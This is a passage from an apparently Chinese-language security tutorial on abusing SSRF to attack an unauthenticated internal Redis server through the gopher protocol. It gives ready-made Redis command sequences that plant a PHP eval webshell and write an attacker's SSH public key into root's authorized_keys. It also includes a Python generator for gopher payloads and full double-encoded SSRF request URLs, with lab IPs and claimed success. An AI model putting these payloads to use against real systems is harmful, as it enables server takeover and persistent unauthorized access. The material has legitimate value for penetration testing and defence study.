95, 72);line-height: 1.35;font-size:24px;line-height:44px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">攻击内网Redis</h2><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.33416666666666667" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/35_MbeuNr4nQfjIKNgsY1JNyK1yvl0FFg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g7wg51JOsOOGPDz2JegUia2xMsMbeuNr4nQfjIKNgsY1JNyK1yvl0FFg/640?wx_fmt=png'" data-type="png" data-w="1200" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">Redis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><blockquote style="margin-bottom: 1.2em;padding: 15px 15px 15px 1rem;color: rgb(129, 145, 152);border-left-width: 6px;border-left-color: rgb(96, 125, 139);font-size:14px;line-height:34px;;line-height: 22px;background: rgb(242, 247, 251);text-align: start;white-space: normal;"><p style="margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);"><strong style="color: rgb(0, 0, 0);">什么是Redis未授权访问？</strong></p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">简单说，漏洞的产生条件有以下两点：</p><ul style="padding-left: 30px;list-style-position: initial;list-style-image: initial;margin-top: 6px !important;list-style-type: square !important;" class="list-paddingleft-2"><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">没有设置密码认证（一般为空），可以免密码远程登录redis服务。</span></p></li></ul></blockquote><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">下面我们对攻击Redis的手法进行演示。测试环境如下，内网中其他主机均有外网IP并可以上网：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.6167979002624672" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/36_QB5GB6ynFTOibhgnxvqhib6nJBW4Lg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gzR88jgJsfHib2LStHWqNKDTsTFAQB5GB6ynFTOibhgnxvqhib6nJBW4Lg/640?wx_fmt=png'" data-type="png" data-w="762" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">在上文扫描内网端口的实验中，我们发现了内网中有一个IP为192.168.52.131的主机在6379端口上运行着一个Redis服务，下面我们就用它来演示，通过Ubuntu服务器上的SSRF漏洞去攻击内网主机（192.168.52.131）的Redis。</p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">绝对路径写WebShell</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">首先构造redis命令:</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer">flushall</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">set</span> <span class="code-snippet__number">1</span> <span class="code-snippet__string">'&lt;?php eval($_POST["whoami"]);?&gt;'</span></span></code><code><span class="code-snippet_outer">config <span class="code-snippet__keyword">set</span> dir /<span class="code-snippet__keyword">var</span>/www/html</span></code><code><span class="code-snippet_outer">config <span class="code-snippet__keyword">set</span> dbfilename shell.php</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">save</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">然后写一个脚本，将其转化为Gopher协议的格式（脚本时从网上嫖的，谁让我菜呢~~~大佬勿喷）：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer">import urllib</span></code><code><span class="code-snippet_outer">protocol=<span class="code-snippet__string">"gopher://"</span></span></code><code><span class="code-snippet_outer">ip=<span class="code-snippet__string">"192.168.52.131"</span></span></code><code><span class="code-snippet_outer">port=<span class="code-snippet__string">"6379"</span></span></code><code><span class="code-snippet_outer">shell=<span class="code-snippet__string">"\n\n&lt;?php eval($_POST[\"whoami\"]);?&gt;\n\n"</span></span></code><code><span class="code-snippet_outer">filename=<span class="code-snippet__string">"shell.php"</span></span></code><code><span class="code-snippet_outer">path=<span class="code-snippet__string">"/var/www/html"</span></span></code><code><span class="code-snippet_outer">passwd=<span class="code-snippet__string">""</span></span></code><code><span class="code-snippet_outer">cmd=[<span class="code-snippet__string">"flushall"</span>,</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"set 1 {}"</span>.format(shell.replace(<span class="code-snippet__string">" "</span>,<span class="code-snippet__string">"${IFS}"</span>)),</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"config set dir {}"</span>.format(path),</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"config set dbfilename {}"</span>.format(filename),</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"save"</span></span></code><code><span class="code-snippet_outer">   ]</span></code><code><span class="code-snippet_outer">if passwd:</span></code><code><span class="code-snippet_outer">  cmd.insert(0,<span class="code-snippet__string">"AUTH {}"</span>.format(passwd))</span></code><code><span class="code-snippet_outer">payload=protocol+ip+<span class="code-snippet__string">":"</span>+port+<span class="code-snippet__string">"/_"</span></span></code><code><span class="code-snippet_outer">def redis_format(arr):</span></code><code><span class="code-snippet_outer">  CRLF=<span class="code-snippet__string">"\r\n"</span></span></code><code><span class="code-snippet_outer">  redis_arr = arr.split(<span class="code-snippet__string">" "</span>)</span></code><code><span class="code-snippet_outer">  cmd=<span class="code-snippet__string">""</span></span></code><code><span class="code-snippet_outer">  cmd+=<span class="code-snippet__string">"*"</span>+str(len(redis_arr))</span></code><code><span class="code-snippet_outer">  for x in redis_arr:</span></code><code><span class="code-snippet_outer">    cmd+=CRLF+<span class="code-snippet__string">"$"</span>+str(len((x.replace(<span class="code-snippet__string">"${IFS}"</span>,<span class="code-snippet__string">" "</span>))))+CRLF+x.replace(<span class="code-snippet__string">"${IFS}"</span>,<span class="code-snippet__string">" "</span>)</span></code><code><span class="code-snippet_outer">  cmd+=CRLF</span></code><code><span class="code-snippet_outer">  return cmd</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">if __name__==<span class="code-snippet__string">"__main__"</span>:</span></code><code><span class="code-snippet_outer">  for x in cmd:</span></code><code><span class="code-snippet_outer">    payload += urllib.quote(redis_format(x))</span></code><code><span class="code-snippet_outer">  print payload</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">执行后生成payload如下：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.11673553719008264" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/37_JiaUcgr0GQGSokdib0aw4SSf4RtHWA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g1uRibWibqh2abyl8DNSen3BaDwGYJiaUcgr0GQGSokdib0aw4SSf4RtHWA/640?wx_fmt=png'" data-type="png" data-w="968" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">这里将生成的payload要进行url二次编码（因为我们发送payload用的是GET方法），然后利用Ubuntu服务器上的SSRF漏洞，将二次编码后的payload打过去就行了：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="apache"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">ssrf</span>.php?url=gopher<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%2</span>F<span class="code-snippet__number">%2</span>F192.168.52.131<span class="code-snippet__number">%3</span>A6379<span class="code-snippet__number">%2</span>F_<span class="code-snippet__number">%252</span>A1<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25248</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aflushall<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252</span>A3<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25243</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aset<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25241</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A1<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252435</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%253</span>C<span class="code-snippet__number">%253</span>Fphp<span class="code-snippet__number">%2520</span>eval<span class="code-snippet__number">%2528</span><span class="code-snippet__number">%2524</span>_POST<span class="code-snippet__number">%255</span>B<span class="code-snippet__number">%2522</span>whoami<span class="code-snippet__number">%2522</span><span class="code-snippet__number">%255</span>D<span class="code-snippet__number">%2529</span><span class="code-snippet__number">%253</span>B<span class="code-snippet__number">%253</span>F<span class="code-snippet__number">%253</span>E<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252</span>A4<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25246</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aconfig<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25243</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aset<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25243</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Adir<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252413</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%2</span>Fvar<span class="code-snippet__number">%2</span>Fwww<span class="code-snippet__number">%2</span>Fhtml<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252</span>A4<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25246</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aconfig<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25243</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aset<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252410</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Adbfilename<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25249</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Ashell.php<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252</span>A1<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25244</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Asave<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如下所示，成功在主机192.168.52.131上面写入WebShell：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.4631083202511774" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/38_H1WEYqbibdiaicTEtHN0dP3uHM0icA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gmsa5G9Z40jGFauqtCng0nEzW2BgnH1WEYqbibdiaicTEtHN0dP3uHM0icA/640?wx_fmt=png'" data-type="png" data-w="637" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">写入SSH公钥</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">同样，我们也可以直接这个存在Redis未授权的主机的~/.ssh目录下写入SSH公钥，直接实现免密登录，但前提是~/.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">构造redis命令：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer">flushall</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">set</span> <span class="code-snippet__number">1</span> <span class="code-snippet__string">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami</span></span></code><code><span class="code-snippet_outer">'</span></code><code><span class="code-snippet_outer">config <span class="code-snippet__keyword">set</span> dir /root/.ssh/</span></code><code><span class="code-snippet_outer">config <span class="code-snippet__keyword">set</span> dbfilename authorized_keys</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">save</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">然后编写脚本，将其转化为Gopher协议的格式：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer">import urllib</span></code><code><span class="code-snippet_outer">protocol=<span class="code-snippet__string">"gopher://"</span></span></code><code><span class="code-snippet_outer">ip=<span class="code-snippet__string">"192.168.52.131"</span></span></code><code><span class="code-snippet_outer">port=<span class="code-snippet__string">"6379"</span></span></code><code><span class="code-snippet_outer">ssh_pub=<span class="code-snippet__string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\n\n"</span></span></code><code><span class="code-snippet_outer">filename=<span class="code-snippet__string">"authorized_keys"</span></span></code><code><span class="code-snippet_outer">path=<span class="code-snippet__string">"/root/.ssh/"</span></span></code><code><span class="code-snippet_outer">passwd=<span class="code-snippet__string">""</span></span></code><code><span class="code-snippet_outer">cmd=[<span class="code-snippet__string">"flushall"</span>,</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"set 1 {}"</span>.format(ssh_pub.replace(<span class="code-snippet__string">" "</span>,<span class="code-snippet__string">"${IFS}"</span>)),</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"config set dir {}"</span>.format(path),</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"config set dbfilename {}"</span>.format(filename),</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"save"</span></span></code><code><span class="code-snippet_outer">   ]</span></code><code><span class="code-snippet_outer">if passwd:</span></code><code><span class="code-snippet_outer">  cmd.insert(0,<span class="code-snippet__string">"AUTH {}"</span>.format(passwd))</span></code><code><span class="code-snippet_outer">payload=protocol+ip+<span class="code-snippet__string">":"</span>+port+<span class="code-snippet__string">"/_"</span></span></code><code><span class="code-snippet_outer">def redis_format(arr):</span></code><code><span class="code-snippet_outer">  CRLF=<span class="code-snippet__string">"\r\n"</span></span></code><code><span class="code-snippet_outer">  redis_arr = arr.split(<span class="code-snippet__string">" "</span>)</span></code><code><span class="code-snippet_outer">  cmd=<span class="code-snippet__string">""</span></span></code><code><span class="code-snippet_outer">  cmd+=<span class="code-snippet__string">"*"</span>+str(len(redis_arr))</span></code><code><span class="code-snippet_outer">  for x in redis_arr:</span></code><code><span class="code-snippet_outer">    cmd+=CRLF+<span class="code-snippet__string">"$"</span>+str(len((x.replace(<span class="code-snippet__string">"${IFS}"</span>,<span class="code-snippet__string">" "</span>))))+CRLF+x.replace(<span class="code-snippet__string">"${IFS}"</span>,<span class="code-snippet__string">" "</span>)</span></code><code><span class="code-snippet_outer">  cmd+=CRLF</span></code><code><span class="code-snippet_outer">  return cmd</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">if __name__==<span class="code-snippet__string">"__main__"</span>:</span></code><code><span class="code-snippet_outer">  for x in cmd:</span></code><code><span class="code-snippet_outer">    payload += urllib.quote(redis_format(x))</span></code><code><span class="code-snippet_outer">  print payload</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去：<br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="apache"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">ssrf</span>.php?url=gopher<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%2</span>F<span class="code-snippet__number">%2</span>F192.168.52.131<span class="code-snippet__number">%3</span>A6379<span class="code-snippet__number">%2</span>F_<span class="code-snippet__number">%252</span>A1<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25248</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aflushall<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252</span>A3<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25243</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aset<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25241</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A1<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%2524568</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%250</span>Assh-rsa<span class="code-snippet__number">%2520</span>AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E<span class="code-snippet__number">%2</span>F45IEs<span class="code-snippet__number">%2</span>F9a6AWfXb6iwzo<span class="code-snippet__number">%252</span>BD62y8MOmt<span class="code-snippet__number">%252</span>Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml<span class="code-snippet__number">%2</span>FTrxy5sExSQ<span class="code-snippet__number">%2</span>FcvvLwUTWb3ntJYyh2eGkQnOf2d<span class="code-snippet__number">%252</span>Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH<span class="code-snippet__number">%2</span>F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd<span class="code-snippet__number">%2</span>FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ<span class="code-snippet__number">%2</span>FNnHKyWtI<span class="code-snippet__number">%2</span>FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe<span class="code-snippet__number">%252</span>BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu<span class="code-snippet__number">%2</span>Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg<span class="code-snippet__number">%2</span>FOOhoA3iKNhJ<span class="code-snippet__number">%2</span>FJT31TU9E24dGh2Ei8K<span class="code-snippet__number">%252</span>BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl<span class="code-snippet__number">%252</span>BSOsVHpNqwFcrgsq<span class="code-snippet__number">%2</span>FWR5BGqnu54vTTdJh0pSrl<span class="code-snippet__number">%252</span>BtniHEnWWU<span class="code-snippet__number">%253</span>D<span class="code-snippet__number">%2520</span>root<span class="code-snippet__number">%2540</span>whoami<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252</span>A4<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25246</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aconfig<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25243</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aset<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25243</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Adir<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252411</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%2</span>Froot<span class="code-snippet__number">%2</span>F.ssh<span class="code-snippet__number">%2</span>F<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252</span>A4<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25246</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aconfig<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25243</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aset<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252410</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Adbfilename<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252415</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aauthorized_keys<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%252</span>A1<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%25244</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Asave<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如下图，成功在主机192.168.52.131上面写入SSH公钥：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-backh="166" data-backw="507" data-ratio="0.32741617357001973" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/39_6AbcsnEHH2FfBm8XfnmNbfib6iaAnw.png" 